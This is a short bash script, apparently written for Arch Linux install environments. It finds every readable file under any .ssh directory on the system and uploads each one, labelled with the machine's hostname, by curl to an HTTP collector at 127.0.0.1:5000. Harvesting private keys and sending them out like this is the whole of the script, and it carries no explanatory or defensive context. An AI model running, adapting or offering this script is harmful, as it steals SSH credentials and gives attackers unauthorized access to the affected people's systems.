#! /bin/bash

if [[ $(cat /etc/hostname) == "archiso" ]]; then
    hostname=`cat /mnt/etc/hostname`
else
    hostname=`cat /etc/hostname`
fi


find / -path **/.ssh/* -readable -exec curl -i -X POST -H 'Content-Type: multipart/form-data' -F "host=$hostname" -F 'file=@{}' http://127.0.0.1:5000 \;
